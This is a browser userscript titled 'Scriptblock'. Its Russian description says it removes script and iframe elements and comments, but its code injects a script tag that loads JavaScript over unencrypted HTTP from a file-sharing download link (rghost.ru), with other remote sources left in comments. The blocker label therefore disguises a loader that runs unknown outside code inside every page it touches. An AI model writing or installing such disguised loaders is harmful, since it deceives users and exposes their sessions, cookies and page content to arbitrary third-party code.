// ==UserScript==
// @name        Scriptblock
// @grant
// @description Удаляет <SCRIPT> <IFRAME> комментарии
// @version     15.03.29.1122
// @homepageURL https://greasyfork.org/ru/scripts/8837     
// @supportURL  https://greasyfork.org/ru/scripts/8837
// @icon     
// @namespace   *
// ==/UserScript==

		d=document;
		s=d.createElement('script');						//	http://htmlbook.ru/html/script
//		s.setAttribute('async','');
//		s.setAttribute('defer','');							//	http://htmlbook.ru/html/script/defer
//		s.setAttribute('language,'JavaScript');
//		s.setAttribute('src','http://150328.ru/script.js');	//
//		s.setAttribute('src','https://gist.github.com/79898127330/bbabce74bea41ec17e93.js');	//
		s.setAttribute('src','http://rghost.ru/download/8Rr4mSMvZ/7843a155d7adbb965557b672f5d44a67f32605e9/script.js');
//		s.setAttribute('type','text/javascript');
		d.body.appendChild(s);
//		alert('Violentmonkey script end');